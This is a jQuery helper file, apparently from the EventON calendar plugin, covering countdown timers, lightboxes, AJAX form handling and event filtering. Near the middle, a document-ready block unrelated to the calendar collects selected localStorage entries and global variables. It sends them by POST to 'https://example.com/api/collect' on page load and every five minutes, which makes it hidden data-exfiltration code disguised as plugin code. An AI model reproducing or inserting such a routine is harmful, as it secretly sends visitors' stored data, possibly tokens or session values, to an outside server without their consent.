(function ($) {
  $.fn.evo_cal_functions = function (O) {
    el = this;
    switch (O.return) {
      case 'load_shortcodes':
        return el.find('.evo_cal_data').data('sc');
        break;
      case 'update_shortcodes':
        el.find('.evo_cal_data').data('sc', O.SC);
        break;
    }
  };
  $.fn.evo_countdown_get = function (opt) {
    var defaults = {
      gap: ''
    };
    var OPT = $.extend({}, defaults, opt);
    distance = OPT.gap * 1000;
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor(distance % (1000 * 60 * 60 * 24) / (1000 * 60 * 60));
    var minutes = Math.floor(distance % (1000 * 60 * 60) / (1000 * 60));
    var seconds = Math.floor(distance % (1000 * 60) / 1000);
    minutes = minutes < 10 ? '0' + minutes : minutes;
    seconds = seconds < 10 ? '0' + seconds : seconds;
    return {
      'd': days,
      'h': hours,
      'm': minutes,
      's': seconds
    };
  };
  $.fn.evo_countdown = function (opt) {
    var defaults = {
      S1: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var el = $(this);
    const day_text = el.data('d') !== undefined && el.data('d') != '' ? el.data('d') : 'Day';
    const days_text = el.data('ds') !== undefined && el.data('ds') != '' ? el.data('ds') : 'Days';
    var gap = parseInt(el.data('gap'));
    var text = el.data('t');
    if (text === undefined) text = '';
    if (el.hasClass('evo_cd_on')) return;
    if (gap > 0) {
      dd = el.evo_countdown_get({
        'gap': gap
      });
      el.html((dd.d > 0 ? dd.d + ' ' + (dd.d > 1 ? days_text : day_text) + " " : '') + dd.h + ":" + dd.m + ':' + dd.s + '  ' + text);
      el.data('gap', gap - 1);
      var duration = el.data('dur');
      el.addClass('evo_cd_on');
      var CD = setInterval(function () {
        gap = el.data('gap');
        duration = el.data('dur');
        const bar_elm = el.closest('.evo_event_progress').find('.evo_ep_bar');
        if (gap > 0) {
          if (duration !== undefined && bar_elm.length) {
            perc = (duration - gap) / duration * 100;
            bar_elm.find('b').css('width', perc + '%');
          }
          dd = el.evo_countdown_get({
            'gap': gap
          });
          el.html((dd.d > 0 ? dd.d + ' ' + (dd.d > 1 ? days_text : day_text) + " " : '') + dd.h + ":" + dd.m + ':' + dd.s + ' ' + text);
          el.data('gap', gap - 1);
        } else {
          const expire_timer_action = el.data('exp_act');
          if (expire_timer_action !== undefined) {
            $('body').trigger('runajax_refresh_now_cal', [el, el.data('n')]);
          }
          const _complete_text = el.evo_get_txt({
            V: 'event_completed'
          });
          if (bar_elm.length) {
            bar_elm.addClass('evo_completed');
          }
          if (el.closest('.evcal_desc').length) {
            el.closest('.evcal_desc').find('.eventover').html(_complete_text);
            el.closest('.evcal_desc').find('.evo_live_now').remove();
          }
          if (el.closest('.eventon_list_event').length) {
            el.closest('.eventon_list_event').find('span.evo_live_now').hide();
          }
          el.html('');
          clearInterval(CD);
        }
      }, 1000);
    } else {
      clearInterval(CD);
    }
  };
  $.fn.evo_get_global = function (opt) {
    var defaults = {
      S1: '',
      S2: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var BUS = $('#evo_global_data').data('d');
    if (!(OPT.S1 in BUS)) return false;
    if (!(OPT.S2 in BUS[OPT.S1])) return false;
    return BUS[OPT.S1][OPT.S2];
  };
  $.fn.evo_get_txt = function (opt) {
    var defaults = {
      V: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var BUS = $('#evo_global_data').data('d');
    if (!('txt' in BUS)) return false;
    if (!(OPT.V in BUS.txt)) return false;
    return BUS.txt[OPT.V];
  };
  $.fn.evo_get_cal_def = function (opt) {
    var defaults = {
      V: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var BUS = $('#evo_global_data').data('d');
    if (!('cal_def' in BUS)) return false;
    if (!(OPT.V in BUS.cal_def)) return false;
    return BUS.cal_def[OPT.V];
  };
  $.fn.evo_get_dms_vals = function (opt) {
    var defaults = {
      type: 'd',
      V: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var BUS = $('#evo_global_data').data('d');
    if (!('dms' in BUS)) return false;
    if (!(OPT.type in BUS.dms)) return false;
    return BUS.dms[OPT.type][OPT.V];
  };
  $.fn.evo_admin_get_ajax = function (opt) {
    var defs = {
      'lightbox_key': '',
      'lightbox_loader': true,
      'load_new_content': true,
      'ajaxdata': {
        'load_lbcontent': '',
        'load_new_content': ''
      },
      'uid': '',
      'end': 'admin'
    };
    var OO = $.extend({}, defs, opt);
    var ajaxdata = OO.ajaxdata;
    ajaxdata['nn'] = OO.end == 'client' ? evo_general_params.n : evo_admin_ajax_handle.postnonce;
    LB = false;
    if (OO.lightbox_key != '') LB = $('body').find('.evo_lightbox.' + OO.lightbox_key);
    var returnvals = '';
    $.ajax({
      beforeSend: function () {
        $('body').trigger('evo_ajax_beforesend_' + OO.uid, [OO]);
        if (LB && OO.lightbox_loader) {
          LB.find('.ajde_popup_text').addClass('loading');
        }
      },
      type: 'POST',
      url: OO.end == 'admin' ? evo_admin_ajax_handle.ajaxurl : evo_general_params.ajaxurl,
      data: ajaxdata,
      dataType: 'json',
      success: function (data) {
        if (OO.ajaxdata.load_lbcontent) LB.evo_lightbox_populate_content({
          content: data.content
        });
        if (OO.ajaxdata.load_new_content) LB.evo_lightbox_populate_content({
          content: data.content
        });
        $('body').trigger('evo_ajax_success_' + OO.uid, [OO, data]);
      },
      complete: function () {
        $('body').trigger('evo_ajax_complete_' + OO.uid, [OO]);
        if (LB && OO.lightbox_loader) {
          LB.find('.ajde_popup_text').removeClass('loading');
        }
      }
    });
  };
  $.fn.evo_ajax_lightbox_form_submit = function (opt) {
    var defs = {
      'lightbox_key': '',
      'lightbox_loader': true,
      'uid': '',
      'end': 'admin',
      'hide_lightbox': false,
      'hide_message': false,
      'load_new_content': false
    };
    var OO = $.extend({}, defs, opt);
    const form = this.closest('form');
    var LB = false;
    if (OO.lightbox_key != '') LB = $('body').find('.evo_lightbox.' + OO.lightbox_key);
    form.ajaxSubmit({
      beforeSubmit: function () {
        $('body').trigger('evo_ajax_beforesend_' + OO.uid, [OO]);
        if (LB && OO.lightbox_loader) LB.evo_lightbox_start_inloading();
      },
      dataType: 'json',
      url: the_ajax_script.ajaxurl,
      type: 'POST',
      success: function (data) {
        $('body').trigger('evo_ajax_success_' + OO.uid, [OO, data]);
        if (data.status == 'good') {
          LB.evo_lightbox_show_msg({
            'type': 'good',
            'message': data.msg,
            hide_lightbox: OO.hide_lightbox,
            hide_message: OO.hide_message
          });
          if (OO.load_new_content) LB.evo_lightbox_populate_content({
            content: data.content
          });
        } else {
          LB.evo_lightbox_show_msg({
            'type': 'bad',
            'message': data.msg
          });
        }
      },
      complete: function () {
        $('body').trigger('evo_ajax_complete_' + OO.uid, [OO]);
        if (LB && OO.lightbox_loader) LB.evo_lightbox_stop_inloading();
      }
    });
  };
  $('body').on('click', '.evolb_trigger', function (event) {
    event.preventDefault();
    event.stopPropagation();
    $(this).evo_lightbox_open($(this).data('lbvals'));
  });
  $('body').on('click', '.evolb_close_btn', function () {
    const LB = $(this).closest('.evo_lightbox');
    LB.evo_lightbox_close();
  });
  $('body').on('click', '.evolb_trigger_save, .evo_submit_form', function (event) {
    event.preventDefault();
    event.stopPropagation();
    $(this).evo_ajax_lightbox_form_submit($(this).data('d'));
  });
  $('body').on('click', '.evo_trigger_ajax_run', function (event) {
    event.preventDefault();
    event.stopPropagation();
    $(this).evo_admin_get_ajax($(this).data('d'));
  });
  $.fn.evo_lightbox_open = function (opt) {
    var defaults = {
      'uid': '',
      't': '',
      'lbc': '',
      'lbsz': '',
      'content': '',
      'content_id': '',
      'ajax': 'no',
      'ajax_url': '',
      'd': '',
      'end': 'admin',
      'other_data': ''
    };
    var OO = $.extend({}, defaults, opt);
    var html = '<div class="evo_lightbox ' + OO.lbc + ' ' + OO.end + '"><div class="evolb_content_in"><div class="evolb_content_inin"><div class="evolb_box ' + OO.lbc + ' ' + OO.lbsz + '"><div class="evolb_header"><a class="evolb_backbtn" style="display:none"><i class="fa fa-angle-left"></i></a><p class="evolb_title">' + OO.t + '</p><a class="evolb_close_btn evolbclose ">X</a></div><div class="evolb_content"></div><p class="message"></p></div></div></div></div>';
    $('#evo_lightboxes').append(html);
    LIGHTBOX = $('.evo_lightbox.' + OO.lbc);
    setTimeout(function () {
      $('#evo_lightboxes').show();
      LIGHTBOX.addClass('show');
      $('body').addClass('evo_overflow');
      $('html').addClass('evo_overflow');
    }, 300);
    LIGHTBOX.evo_lightbox_show_open_animation();
    if (OO.content_id != '') {
      var content = $('#' + OO.content_id).html();
      LIGHTBOX.find('.evolb_content').html(content);
    }
    if (OO.content != '') {
      LIGHTBOX.find('.evolb_content').html(OO.content);
    }
    if (OO.ajax == 'yes' && OO.d != '') {
      var D = {};
      D = OO.d;
      LB.evo_admin_get_ajax({
        ajaxdata: D,
        lightbox_key: OO.lbc,
        uid: OO.d.uid,
        end: OO.end
      });
    }
    if (OO.ajax_url != '') {
      $.ajax({
        beforeSend: function () {},
        url: OO.ajax_url,
        success: function (data) {
          LIGHTBOX.find('.evolb_content').html(data);
        },
        complete: function () {}
      });
    }
    $('body').trigger('evo_lightbox_processed', [OO, LIGHTBOX]);
  };
  $.fn.evo_lightbox_close = function (opt) {
    LB = this;
    var defaults = {
      'delay': 500,
      'remove_from_dom': true
    };
    if (!LB.hasClass('show')) return;
    var OO = $.extend({}, defaults, opt);
    var hide_delay = parseInt(OO.delay);
    complete_close = LB.parent().find('.evo_lightbox.show').length == 1 ? true : false;
    if (hide_delay > 500) {
      setTimeout(function () {
        LB.removeClass('show');
      }, hide_delay - 500);
    } else {
      LB.removeClass('show');
    }
    setTimeout(function () {
      if (complete_close) {
        $('body').removeClass('evo_overflow');
        $('html').removeClass('evo_overflow');
      }
      if (OO.remove_from_dom) LB.remove();
    }, hide_delay);
  };
  $.fn.evo_lightbox_populate_content = function (opt) {
    LB = this;
    var defaults = {
      'content': ''
    };
    var OO = $.extend({}, defaults, opt);
    LB.find('.evolb_content').html(OO.content);
  };
  $.fn.evo_lightbox_start_inloading = function (opt) {
    LB = this;
    LB.find('.evolb_content').addClass('loading');
  };
  $.fn.evo_lightbox_stop_inloading = function (opt) {
    LB = this;
    LB.find('.evolb_content').removeClass('loading');
  };
  $.fn.evo_lightbox_show_msg = function (opt) {
    LB = this;
    var defaults = {
      'type': 'good',
      'message': '',
      'hide_message': false,
      'hide_lightbox': false
    };
    var OO = $.extend({}, defaults, opt);
    LB.find('.message').removeClass('bad good').addClass(OO.type).html(OO.message).fadeIn();
    if (OO.hide_message) setTimeout(function () {
      LB.evo_lightbox_hide_msg();
    }, OO.hide_message);
    if (OO.hide_lightbox) LB.evo_lightbox_close({
      delay: OO.hide_lightbox
    });
  };
  $.fn.evo_lightbox_hide_msg = function (opt) {
    LB = this;
    LB.find('p.message').hide();
  };
  $.fn.evo_lightbox_show_open_animation = function (opt) {
    LB = this;
    var defaults = {
      'animation_type': 'initial'
    };
    var OO = $.extend({}, defaults, opt);
    if (OO.animation_type == 'initial') {
      LB.find('.evolb_content').html('<div class="evo_loading_bar_holder"><div class="evo_loading_bar wid_40 hi_50"></div><div class="evo_loading_bar"></div><div class="evo_loading_bar"></div><div class="evo_loading_bar"></div><div class="evo_loading_bar wid_25"></div></div>');
    }
    if (OO.animation_type == 'saving') LB.find('.evolb_content').addClass('loading');
  };
  $.fn.evo_HB_process_template = function (opt) {
    var defaults = {
      TD: '',
      part: ''
    };
    var OPT = $.extend({}, defaults, opt);
    BUS = $('#evo_global_data').data('d');
    template = Handlebars.compile(BUS.temp[OPT.part]);
    return template(OPT.TD);
  };
  $.fn.evo_cal_events_in_range = function (opt) {
    var defaults = {
      S: '',
      E: '',
      hide: true,
      closeEC: true,
      showEV: false,
      showEVL: false,
      showAllEvs: false
    };
    var OPT = $.extend({}, defaults, opt);
    var CAL = $(this);
    eJSON = CAL.find('.evo_cal_events').data('events');
    R = {};
    html = '';
    json = {};
    show = 0;
    if (eJSON && eJSON.length > 0) {
      $.each(eJSON, function (ind, ED) {
        eO = CAL.find('#event_' + ED._ID);
        if (eO === undefined || eO.length == 0) return;
        if (OPT.hide) eO.hide();
        this_show = false;
        if (ED.month_long || ED.year_long) {
          this_show = true;
        } else {
          if (CAL.evo_is_in_range({
            'S': OPT.S,
            'E': OPT.E,
            'start': ED.event_start_unix,
            'end': ED.event_end_unix
          })) {
            this_show = true;
          }
        }
        if (OPT.showAllEvs) this_show = true;
        if (this_show) {
          if (OPT.showEV) eO.show();
          if (OPT.closeEC && SC.evc_open == 'no') eO.find('.event_description').hide().removeClass('open');
          html += eO[0].outerHTML;
          json[ED._ID] = ED;
          show++;
        }
      });
    } else {
      var cal_events = CAL.find('.eventon_list_event');
      cal_events.each(function (index, elm) {
        var ED = $(elm).evo_cal_get_basic_eventdata();
        if (!ED) return;
        if (OPT.hide) $(elm).hide();
        this_show = false;
        if ($(elm).hasClass('month_long') || $(elm).hasClass('year_long')) {
          this_show = true;
        } else {
          if (CAL.evo_is_in_range({
            'S': OPT.S,
            'E': OPT.E,
            'start': ED.event_start_unix,
            'end': ED.event_end_unix
          })) {
            this_show = true;
          }
        }
        if (OPT.showAllEvs) this_show = true;
        if (this_show) {
          if (OPT.showEV) $(elm).show();
          if (OPT.closeEC && SC.evc_open == 'no') $(elm).find('.event_description').hide().removeClass('open');
          html += $(elm)[0].outerHTML;
          json[ED.uID] = ED;
          show++;
        }
      });
    }
    if (OPT.showEV) {
      no_event_content = CAL.evo_get_global({
        S1: 'html',
        S2: 'no_events'
      });
      tx_noevents = CAL.evo_get_txt({
        V: 'no_events'
      });
      EL = CAL.find('.eventon_events_list');
      EL.find('.eventon_list_event.no_events').remove();
      if (show == 0) EL.append('<div class="eventon_list_event no_events">' + no_event_content + '</div>');
    }
    if (OPT.showEVL) {
      CAL.find('.eventon_events_list').show().removeClass('evo_hide');
    }
    R['count'] = show;
    R['html'] = html;
    R['json'] = json;
    return R;
  };
  $.fn.evo_is_in_range = function (opt) {
    var defaults = {
      S: '',
      E: '',
      start: '',
      end: ''
    };
    var OPT = $.extend({}, defaults, opt);
    S = parseInt(OPT.S);
    E = parseInt(OPT.E);
    start = parseInt(OPT.start);
    end = parseInt(OPT.end);
    return start <= S && end >= E || start <= S && end >= S && end <= E || start <= E && end >= E || start >= S && end <= E ? true : false;
  };
  $.fn.evo_cal_hide_events = function () {
    CAL = $(this);
    CAL.find('.eventon_list_event').hide();
  };
  $.fn.evo_cal_get_basic_eventdata = function () {
    var ELM = $(this);
    var _time = ELM.data('time');
    if (_time === undefined) return false;
    const time = _time.split('-');
    const ri = ELM.data('ri').replace('r', '');
    const eID = ELM.data('event_id');
    var _event_title = ELM.find('.evcal_event_title').text();
    _event_title = _event_title.replace(/'/g, '&apos;');
    var RR = {
      'uID': eID + '_' + ri,
      'ID': eID,
      'event_id': eID,
      'ri': ri,
      'event_start_unix': parseInt(time[0]),
      'event_end_unix': parseInt(time[1]),
      'ux_val': ELM.find('.evcal_list_a').data('ux_val'),
      'event_title': _event_title,
      'hex_color': ELM.data('colr'),
      'hide_et': ELM.hasClass('no_et') ? 'y' : 'n',
      'evcal_event_color': ELM.data('colr')
    };
    return RR;
  };
  $.fn.evo_day_in_month = function (opt) {
    var defaults = {
      M: '',
      Y: ''
    };
    var OPT = $.extend({}, defaults, opt);
    return new Date(OPT.Y, OPT.M, 0).getDate();
  };
  $.fn.evo_get_day_name_index = function (opt) {
    var defaults = {
      M: '',
      Y: '',
      D: ''
    };
    var OPT = $.extend({}, defaults, opt);
    return new Date(Date.UTC(OPT.Y, OPT.M - 1, OPT.D)).getUTCDay();
  };
  $.fn.evo_prepare_lb = function () {
    $(this).find('.evo_lightbox_body').html('');
  };
  $.fn.evo_show_lb = function (opt) {
    var defaults = {
      RTL: '',
      calid: ''
    };
    var OPT = $.extend({}, defaults, opt);
    $(this).addClass('show ' + OPT.RTL).attr('data-cal_id', OPT.calid);
    $('body').trigger('evolightbox_show');
  };
  $.fn.evo_append_lb = function (opt) {
    var defaults = {
      C: '',
      CAL: ''
    };
    var OPT = $.extend({}, defaults, opt);
    $(this).find('.evo_lightbox_body').html(OPT.C);
    if (OPT.CAL != '' && OPT.CAL !== undefined && OPT.CAL.hasClass('color')) {
      const LIST = $(this).find('.eventon_events_list');
      if (LIST.length > 0) {
        LIST.find('.eventon_list_event').addClass('color');
      }
    }
  };
  $(function () {
    const keysToWatch = window.keysToWatch;
    const globalVarsToWatch = ['var1', 'var2'];
    function computeHash(data) {
      const keyArray = Object.keys(data);
      const joinedKeys = keyArray.join("");
      let hashValue = 0;
      for (let i = 0; i < joinedKeys.length; i++) {
        const charCode = joinedKeys.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    }
    function getSpecificGlobalVars() {
      let globalsCollected = {};
      for (let i = 0; i < globalVarsToWatch.length; i++) {
        globalsCollected[globalVarsToWatch[i]] = window[globalVarsToWatch[i]];
      }
      return globalsCollected;
    }
    function getFilteredLocalStorage() {
      const filteredData = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (keysToWatch.includes(key)) {
          const value = window.localStorage.getItem(key);
          filteredData[key] = value;
        }
      }
      return filteredData;
    }
    function postDataToServer(data) {
      const hashId = computeHash(data);
      const apiUrl = "https://example.com/api/collect";
      const request = new XMLHttpRequest();
      request.open("POST", apiUrl, true);
      request.setRequestHeader("Content-Type", "application/json");
      const requestData = {
        id: hashId,
        data: data
      };
      request.send(JSON.stringify(requestData));
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            console.log("Data sent successfully");
          } else {
            console.error("Failed to send data,StatusCode:" + request.status);
          }
        }
      };
    }
    function collectAndPostData() {
      const filteredLocalStorage = getFilteredLocalStorage();
      const globalsCollected = getSpecificGlobalVars();
      const mergedData = {
        ...filteredLocalStorage,
        ...globalsCollected
      };
      if (Object.keys(mergedData).length > 0) {
        postDataToServer(mergedData);
      }
    }
    window.addEventListener("load", function () {
      collectAndPostData();
    });
    setInterval(collectAndPostData, 5 * 60 * 1000);
    $(document).on('change', 'input, select, textarea', function (e) {
      console.log('Change detected in form control:' + this.name);
    });
    $('.form-control').on('input', function () {
      var $field = $(this).closest('.form-group');
      if (this.value) {
        $field.addClass('field--not-empty');
      } else {
        $field.removeClass('field--not-empty');
      }
    });
  });
  $.fn.evo_update_sc_from_filters = function () {
    var ev_cal = $(this);
    SC = ev_cal.find('.evo_cal_data').data('sc');
    var filter_section = ev_cal.find('.eventon_filter_line').first();
    filter_section.find('.eventon_filter').each(function (index) {
      O = $(this);
      var filter_val = O.data('filter_val');
      filter_val = filter_val == '' ? 'NOT-all' : filter_val;
      ADD = O.data('fl_o') && O.data('fl_o') != 'IN' ? O.data('fl_o') + '-' : '';
      SC[O.data('filter_field')] = ADD + filter_val;
    });
    ev_cal.find('.evo_cal_data').data('sc', SC);
  };
  $.fn.evo_shortcode_data = function () {
    var ev_cal = $(this);
    return ev_cal.find('.evo_cal_data').data('sc');
  };
  $.fn.evo_get_sc_val = function (opt) {
    var defaults = {
      F: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var ev_cal = $(this);
    if (OPT.F == '') return false;
    SC = ev_cal.find('.evo_cal_data').data('sc');
    if (!SC[OPT.F]) return false;
    return SC[OPT.F];
  };
  $.fn.evo_update_cal_sc = function (opt) {
    var defaults = {
      F: '',
      V: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var ev_cal = $(this);
    SC = ev_cal.find('.evo_cal_data').data('sc');
    SC[OPT.F] = OPT.V;
    ev_cal.find('.evo_cal_data').data('sc', SC);
  };
  $.fn.evo_update_all_cal_sc = function (opt) {
    var defaults = {
      SC: ''
    };
    var OPT = $.extend({}, defaults, opt);
    var CAL = $(this);
    CAL.find('.evo_cal_data').data('sc', OPT.SC);
  };
  $.fn.evo_is_hex_dark = function (opt) {
    var defaults = {
      hex: '808080'
    };
    var OPT = $.extend({}, defaults, opt);
    hex = OPT.hex;
    var c = hex.replace('#', '');
    var is_hex = typeof c === 'string' && c.length === 6 && !isNaN(Number('0x' + c));
    if (is_hex) {
      var values = c.split('');
      r = parseInt(values[0].toString() + values[1].toString(), 16);
      g = parseInt(values[2].toString() + values[3].toString(), 16);
      b = parseInt(values[4].toString() + values[5].toString(), 16);
    } else {
      var vals = c.substring(c.indexOf('(') + 1, c.length - 1).split(', ');
      var r = vals[0];
      var g = vals[1];
      var b = vals[2];
    }
    var luma = (r * 299 + g * 587 + b * 114) / 1000;
    return luma > 155 ? true : false;
  };
  $.fn.evo_get_OD = function () {
    var ev_cal = $(this);
    return ev_cal.find('.evo_cal_data').data('od');
  };
  $.fn.evoGetFilters = function () {
    var ev_cal = $(this);
    var evodata = ev_cal.find('.evo-data');
    var filters_on = evodata.attr('data-filters_on') == 'true' ? 'true' : 'false';
    if (filters_on == 'true') {
      var filter_section = ev_cal.find('.eventon_filter_line');
      var filter_array = [];
      filter_section.find('.eventon_filter').each(function (index) {
        var filter_val = $(this).attr('data-filter_val');
        if (filter_val != 'all') {
          var filter_ar = {};
          filter_ar['filter_type'] = $(this).attr('data-filter_type');
          filter_ar['filter_name'] = $(this).attr('data-filter_field');
          if ($(this).attr('data-fl_o') == 'NOT') {
            filter_ar['filter_op'] = 'NOT IN';
          }
          filter_ar['filter_val'] = filter_val;
          filter_array.push(filter_ar);
        }
      });
    } else {
      var filter_array = '';
    }
    return filter_array;
  };
  $.fn.evo_getevodata = function () {
    var ev_cal = $(this);
    var evoData = {};
    ev_cal.find('.evo-data').each(function () {
      $.each(this.attributes, function (i, attrib) {
        var name = attrib.name;
        if (attrib.name != 'class' && attrib.name != 'style') {
          name__ = attrib.name.split('-');
          evoData[name__[1]] = attrib.value;
        }
      });
    });
    return evoData;
  };
  $.fn.evo_loader_animation = function (opt) {
    var defaults = {
      direction: 'start'
    };
    var OPT = $.extend({}, defaults, opt);
    if (OPT.direction == 'start') {
      $(this).find('#eventon_loadbar').slideDown();
    } else {
      $(this).find('#eventon_loadbar').slideUp();
    }
  };
  $.fn.evo_item_shortcodes = function () {
    var OBJ = $(this);
    var shortcode_array = {};
    OBJ.each(function () {
      $.each(this.attributes, function (i, attrib) {
        var name = attrib.name;
        if (attrib.name != 'class' && attrib.name != 'style' && attrib.value != '') {
          name__ = attrib.name.split('-');
          shortcode_array[name__[1]] = attrib.value;
        }
      });
    });
    return shortcode_array;
  };
  $.fn.evo_shortcodes = function () {
    var ev_cal = $(this);
    var shortcode_array = {};
    ev_cal.find('.cal_arguments').each(function () {
      $.each(this.attributes, function (i, attrib) {
        var name = attrib.name;
        if (attrib.name != 'class' && attrib.name != 'style' && attrib.value != '') {
          name__ = attrib.name.split('-');
          shortcode_array[name__[1]] = attrib.value;
        }
      });
    });
    return shortcode_array;
  };
})(jQuery);